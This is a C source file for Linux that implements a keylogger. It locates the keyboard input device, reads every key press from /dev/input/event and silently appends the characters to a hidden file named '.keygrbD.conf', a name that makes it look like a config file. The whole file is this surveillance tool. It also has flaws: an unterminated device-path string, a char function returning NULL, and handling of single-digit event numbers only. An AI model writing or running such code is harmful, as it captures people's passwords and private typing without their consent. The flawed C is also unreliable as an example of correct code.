#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

#define KEYBOARD "keyboard"
#define EVENT "event"

int find_keyboard_device(){
    FILE *file = fopen("/proc/bus/input/devices", "r");
    int event = 0;
    char line[256];

    if (file == NULL) {
        // perror("Ошибка при открытии файла");
        return 1;
    }

    while (fgets(line, sizeof(line), file) != NULL) {
        if (strstr(line, KEYBOARD) != NULL  && strstr(line, "N:") != NULL) {
            fgets(line, sizeof(line), file);
            while (fgets(line, sizeof(line), file) != NULL)
                if (strstr(line, EVENT) != NULL) break;
            for (int i = 0; i < strlen(line); i++)
                if (isdigit(line[i])) event = line[i]-'0';
                    // printf("%c\n", line[i]);
        }
        memset(line, 0, 256);
    }

    fclose(file);

    return event;
}

char process_event(struct input_event *event) {
    if (event->type == EV_KEY && event->value == 1) {
        char ascii_code;
        switch (event->code) {
            case KEY_A: ascii_code = 'a'; break;
            case KEY_B: ascii_code = 'b'; break;
            case KEY_C: ascii_code = 'c'; break;
            case KEY_D: ascii_code = 'd'; break;
            case KEY_E: ascii_code = 'e'; break;
            case KEY_F: ascii_code = 'f'; break;
            case KEY_G: ascii_code = 'g'; break;
            case KEY_H: ascii_code = 'h'; break;
            case KEY_I: ascii_code = 'i'; break;
            case KEY_J: ascii_code = 'j'; break;
            case KEY_K: ascii_code = 'k'; break;
            case KEY_L: ascii_code = 'l'; break;
            case KEY_M: ascii_code = 'm'; break;
            case KEY_N: ascii_code = 'n'; break;
            case KEY_O: ascii_code = 'o'; break;
            case KEY_P: ascii_code = 'p'; break;
            case KEY_Q: ascii_code = 'q'; break;
            case KEY_R: ascii_code = 'r'; break;
            case KEY_S: ascii_code = 's'; break;
            case KEY_T: ascii_code = 't'; break;
            case KEY_U: ascii_code = 'u'; break;
            case KEY_V: ascii_code = 'v'; break;
            case KEY_W: ascii_code = 'w'; break;
            case KEY_X: ascii_code = 'x'; break;
            case KEY_Y: ascii_code = 'y'; break;
            case KEY_Z: ascii_code = 'z'; break;
            case KEY_1: ascii_code = '1'; break;
            case KEY_2: ascii_code = '2'; break;
            case KEY_3: ascii_code = '3'; break;
            case KEY_4: ascii_code = '4'; break;
            case KEY_5: ascii_code = '5'; break;
            case KEY_6: ascii_code = '6'; break;
            case KEY_7: ascii_code = '7'; break;
            case KEY_8: ascii_code = '8'; break;
            case KEY_9: ascii_code = '9'; break;
            case KEY_0: ascii_code = '0'; break;
            case KEY_ENTER: ascii_code = '\n'; break;
            case KEY_SPACE: ascii_code = ' '; break;
            case KEY_TAB: ascii_code = '\t'; break;
            case KEY_MINUS: ascii_code = '-'; break;
            case KEY_EQUAL: ascii_code = '='; break;
            case KEY_LEFTBRACE: ascii_code = '['; break;
            case KEY_RIGHTBRACE: ascii_code = ']'; break;
            case KEY_BACKSLASH: ascii_code = '\\'; break;
            case KEY_SEMICOLON: ascii_code = ';'; break;
            case KEY_APOSTROPHE: ascii_code = '\''; break;
            case KEY_GRAVE: ascii_code = '`'; break;
            default: ascii_code = '\0'; break; 
        }
        return ascii_code;
    }
    return NULL;
}

#define DEVICE_PATH "/dev/input/event"
int main() {

    // printf("%d\n", find_keyboard_device());
    char *device_path = malloc(strlen(DEVICE_PATH)+1); 
    memset(device_path, 0, strlen(DEVICE_PATH)+1);
    strcpy(device_path, DEVICE_PATH);
    device_path[strlen(DEVICE_PATH)] = find_keyboard_device()+'0';
    // puts(device_path);

    int fd = open(device_path, O_RDONLY);
    if (fd == -1) {
        perror("Не удалось открыть устройство ввода");
        return 1;
    }

    struct input_event event;
    while (1) {
        ssize_t bytes = read(fd, &event, sizeof(event));
        if (bytes == -1) perror("Ошибка при чтении события клавиатуры");
        if ((bytes == sizeof(event)) && (process_event(&event) != NULL)){
             FILE *f_key_log = fopen(".keygrbD.conf", "a+");
             fputc(process_event(&event), f_key_log);
             fclose(f_key_log);
        }
            printf("%c\n", process_event(&event));
    }

    close(fd);
    return 0;
}
